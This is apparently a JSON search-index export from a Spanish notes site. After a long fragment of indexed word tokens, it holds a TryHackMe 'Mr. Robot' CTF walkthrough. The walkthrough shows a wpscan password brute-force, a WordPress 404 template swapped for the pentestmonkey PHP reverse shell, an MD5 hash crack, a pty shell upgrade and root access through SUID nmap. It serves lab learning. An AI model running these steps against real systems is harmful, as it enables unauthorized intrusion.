ditPolicies\nwgCanonicalNamespace\nwgCanonicalSpecialPageName\nwgCategories\nwgCategorySelect\nwgCategoryTreePageCategoryOptions\nwgCatId\nwgCdnApiUrl\nwgCdnRootUrl\nwgCityId\nwgContentLanguage\nwgCookieDomain\nwgCookiePath\nwgCopywarn\nwgCurRevisionId\nwgDartCustomKeyValues\nwgDBname\nwgDigitTransformTable\nwgEditedTitle\nwgEditedTitleNS\nwgEditedTitlePrefix\nwgEditPageClass\nwgEditPageFormType\nwgEditPageHandler\nwgEditPageHasEditPermissionError\nwgEditPageIsConflict\nwgEditPageIsNewArticle\nwgEditPageIsReadOnly\nwgEditPageIsWidePage\nwgEditPageLicensingUrl\nwgEditPagePopularTemplates\nwgEditPageSection\nwgEnableCodePageEditor\nwgEnableFacebookClientExt\nwgEnableLightboxExt\nwgEnableMediaGalleryExt\nwgEnableMiniEditorExt\nwgEnableMiniEditorLinkSuggest\nwgEnableNewAuthModal\nwgEnableOpenXSPC\nwgEnableOutboundScreenExt\nwgEnableVideoToolExt\nwgEnableVisualEditorUI\nwgEnableWebPThumbnails\nwgEnableWikiaBarAds\nwgEnableWikiaBarExt\nwgEnableWikiaFollowedPages\nwgEnableWikiaInteractiveMaps\nwgEnableWikiaMiniUploadExt\nwgEnableWikiaPhotoGalleryExt\nwgExtensionsPath\nwgFollowedPagesPagerLimit\nwgFollowedPagesPagerLimitAjax\nwgGaHasAds\nwgIsArticle\nwgIsContentNamespace\nwgIsDarkTheme\nwgIsEditPage\nwgIsGASpecialWiki\nwgIsMainpage\nwgIsMainPage\nwgLinkSuggestElements\nwgMainpage\nwgMaxUploadSize\nwgMessages\nwgMiniEditorLoadOnDemand\nwgMinimalPasswordLength\nwgMWrevId\nwgNamespaceNumber\nwgNow\nwgOasisBreakpoints\nwgOasisGrid\nwgOasisResponsive\nwgPageContentLanguage\nwgPageName\nwgPoliciesEditURL\nwgPoliciesRev\nwgQualarooUrl\nwgRedirectedFrom\nwgRelevantPageName\nwgResourceBasePath\nwgRestrictionCreate\nwgRestrictionEdit\nwgRestrictionMove\nwgRestrictionUpload\nwgRevisionId\nwgRightsText\nwgSassLoadedScss\nwgSeoTestingBucket\nwgSeparatorTransformTable\nwgShowAdModalInterstitialTimes\nwgSitename\nwgStyleVersion\nwgTimeAgoi18n\nwgTitle\nwgTransactionContext\nwgUsePostScribe\nwgUserGroups\nwgUserName\nwgVisualEditor\nwgVisualEditorPreferred\nwgWeppyConfig\nwgWikiaBarMainLanguages\nwgWikiaChatUsers\nwgWikiaChatWindowFeatures\nwgWikiaMaxNameChars\nwgWikiCategories\nwgWikiFactoryTagIds\nwgWikiFactoryTagNames\nwgWikiVertical\nwh1ter0se\nwhat\nWhat\nWHAT\nwhatever\nWhatever\nWhatLinksHere\nwhats\nWhedon\nwhen\nWhen\nwhenever\nWhenever\nwhere\nWhere\nwhereabouts\nwhether\nwhich\nwhile\nWhile\nWhiplash\nwhispers\nwhite\nWhite\nwhiterose\nWhiterose\nwhitespace\nwho\nWho\nwhole\nwhom\nwhomever\nWhos\nwhose\nwhy\nWhy\nwide\nWIDE\nwidely\nwider\nwidespread\nwidget\nwidth\nWidth\nwidths\nwidthType\nwife\nWIFE\nwifi\nwiki\nWiki\nWIKI\nwikia\nWikia\nWikiaBot\nWikiaby\nwikiacsid\nWikiActivity\nWikiaEnableNewCreatepage\nWikiaLabs\nWikiaMainContent\nWikiaMaps\nwikiamediainsert\nWikiaMr\nwikian\nWikiaNewFiles\nWikians\nWikiaPage\nwikiaPageIsCorporate\nwikiaPageType\nWikiaPhotoGallery\nWikiaPhotoGallerySlider\nWikiaPhotoGallerySlideshow\nWikiaPhotoGalleryView\nwikiarelatedpages\nwikias\nWikias\nWikiaSearch\nWikiaStyleGuide\nwikiAugust\nWikiaVideoAdd\nwikibits\nwikiCategory\nwikiCustomKeyValues\nWikiD\nwikiDbName\nWikifactory\nWikiFeatures\nwikiJuly\nwikiJune\nwikiLanguage\nwikiMay\nWikimedia\nwikin\nwikiNovember\nwikiOctober\nwikipedia\nWikipedia\nwikis\nWikis\nwikiSeptember\nWikiStats\nwikitables\nwikitext\nWikitext\nwikiVertical\nwill\nWill\nWilliam\nwilling\nwin\nwind\nwindow\nWindows\nwine\nwins\nwipe\nwipes\nWire\nwise\nwish\nwishes\nwith\nWith\nwithCaption\nwithdrawal\nwithheld\nwithin\nWithin\nwithout\nWithout\nwitnesses\nWitnessme\nwitz\nwllimit\nwmode\nwmu\nwmv\nwmvAdd\nwmvbr\nwmvby\nWolffirefang\nwoman\nwomen\nwon\nwonder\nwondering\nWong\nWood\nWookieepedia\nword\nwordmark\nWordmark\nwords\nWords\nWordsEdit\nwork\nworked\nWorkers\nworking\nWorking\nworks\nworld\nWorld\nWorldwide\nworldwind\nworn\nworried\nworry\nworrying\nWorse\nworth\nwould\nWould\nwouldn\nwoven\nWow\nwpage\nwpSave\nwpTextbox1\nwrite\nWrite\nwriter\nWriter\nwriters\nwrites\nwriting\nWriting\nwritten\nWritten\nwrong\nWrong\nwronged\nwrote\nwtf\nwuz\nWWII\nwww\nWYNTER\nwysiwyg\nx201C\nx26\nx26A\nx26action\nx26ctype\nx26gt\nx26lt\nx26maxage\nx26rs\nx26smaxage\nx26title\nx3c\nx3ca\nx3cbr\nx3cdiv\nx3cmath\nx3cnowiki\nx3cp\nx3e\nx3eAll\nx3eWikia\nX8UR2TFUp8w\nXD1\nxht\nxhtml\nxjs\nXKCD\nxml\nxmpp\nxNnoRBZWeEQ\nXSS\nYcesoft\nyea\nYea\nyeah\nYeah\nyear\nYear201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901\nyears\nyelled\nyelling\nYep\nyes\nYes\nyesterday\nyesterdays\nyet\nyH5BAEAAAEALAAAAAABAAEAQAICTAEAOw\nyields\nyork\nYork\nyou\nYou\nyoung\nyounger\nyour\nYour\nYOUR\nYoure\nyourself\nYouslypoots\nYouth\nyoutu\nyoutube\nYoutube\nYouTube\nZauberfl\nZealand\nZen\nZeppelin\nzer0\nzer0es\nzero\nZero\nZeroBas\nZeroBased\nzeros\nZeros\nzhthefinalcrush\nZoeyadams\nZombie\nzone\nZone\nzones\nzSqu8myTkY8\nZzydrax\n"
  },
  {
    "title": "3. What is Key 3",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/3-what-is-key-3/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/3. What is Key 3.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "1. ![[020 1.png]]\nUna vez que ya hemos sacado la segunda flag, es hora de rootear la máquina. Para ello primero intentamos ver si podemos ejecutar algún comando con sudo (no es el caso esta vez :'(    ). Entonces intentamos buscar archivos con permiso SUID. Y vemos algo \"interesante\". Nmap no debería tener permisos SUID.\n2. Haciendo una búsqueda rápida en [GTFOBins](https://gtfobins.github.io/), vemos que efectivamente esto se puede explotar.\n3. ![[021 1.png]]\nVemos que hay una manera extremadamente sencilla de ejecutar comandos (si la versión coincide), por lo que hacemos `nmap --version` y bingo! La versión instalada es la 3.81, coincide con los criterios, al lío!\n4. ![[022 1.png]]\nPues en un abrir y cerrar de ojos somos **root**.\n5. ![[023 1.png]]\nPues sólo nos quedaba encontrar el documento de la última flag, que tenía pinta que iba a estar en `/root`. Y así era.\n\n-------\n<h2>Máquina pwneada!!!!</h2>\n\n"
  },
  {
    "title": "2. What is Key 2",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/2-what-is-key-2/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/2. What is Key 2.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "1. ![[005 1.png]]\nEste `fsociety.dic` podría ser un diccionario que podríamos usar más adelante.\n2. Mirando más de cerca [[fsocity_dic]], nos damos cuenta de que no es taaaaan larga, sino que hay lineas que se repiten varias veces. Para cambiar eso hacemos `sort fsocity_dic.md | uniq > fsocity_dic_unic.md`. Ya tenemos un diccionario realista.\n3. ![[004 1.png]]\nInvestigando más directorios vemos un directorio raro que habíamos pasado por alto: `/0`.\n4. ![[009 1.png]]\nUna vez allí vemos que es un \"blog\" de WP. Veamos la pestaña de Log In...\n5. ![[010 1.png]]\nAquí vemos que si ponemos un usuario que no existe nos da un tipo de error.\n6. ![[011.png]]\nSin embargo, si ponemos un usuario que sí existe nos da otro tipo de error. Extrapolando el nombre del protagonista de la serie, parece un nombre que posiblemente estaría en la base de datos de usuarios. Pero espera, teníamos un diccionario, vamos a usarlo:\n7. ![[012 1.png]]\nHaciendo uso del comando: `wpscan --url 10.10.146.45 --wp-content-dir wp-admin --usernames elliot --passwords fsocity_dic_unic.md` comenzamos a extraer información:\n8. ![[013.png]]\nBoom! Credenciales encontradas, vamos a entrar!\n9. ![[14.png]]\nEstamos dentro.\n10. ![[015 1.png]]\nNos dirigimos a `Appearance > Editor`. El objetivo es cambiar la plantilla `404` (not found) por una reverse shell que sacamos de [aquí](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).\n11. ![[016 1.png]]\nCambiamos la IP y el puerto al de nuestra máquina por el que vayamos a escuchar.\n12. ![[017 1.png]]\nDe esta manera obtenemos una reverse shell sh para investigar.\n13. ![[018 1.png]]\nUna vez en la consola navegamos por los directorios y nos encontramos con que no podemos leer la clave 2 de 3 porque no tenemos permisos :((. Pero espera, hay un archivo con un usuario y una contraseña en lo que parece ser md5 según el archivo.\n14. Todos sabemos que el md5 no es seguro para las contraseñas, precisamente por páginas como [esta](https://md5.gromweb.com/). Introducimos `c3fcd3d76192e4007dfb496cca67e13b` --> `abcdefghijklmnopqrstuvwxyz`. Vamos a probar\n15. Para hacer `su robot` necesitamos una tty mejorada, por eso ejecutamos: `python -c 'import pty; pty.spawn(\"/bin/bash\")'`.\n16. ![[019 1.png]]\nParece que algo estamos consiguiendo. Al leer los archivos vemos la key 2 de 3: `822c73956184f694993bede3eb39f959`"
  },
  {
    "title": "0. Mr. Robot CTF",
    "path": "/apuntes/thm/maquinas/2-medium/1-mr-robot/0-mr-robot-ctf/",
    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/1. Mr. Robot/0. Mr. Robot CTF.md",
    "breadcrumb": "THM > Maquinas > 2. Medium > 1. Mr. Robot",
    "content": "Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?\n\nCredit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine. **This machine is used here with the explicit permission of the creator <3**\n\n![[mrrobot.png]]\n\n1. Conectarse a la VPN de TryHackMe con `sudo openvpn <archivo.ovpn>`.\n\n----------------\n<h2>Contenidos</h2>\n\n- [[1. What is Key 1]]\n- [[2. What is Key 2]]\n- [[3. What is Key 3]]\n- [[fsocity_dic]]\n- [[fsocity_dic_unic]]\n\n"
  }
]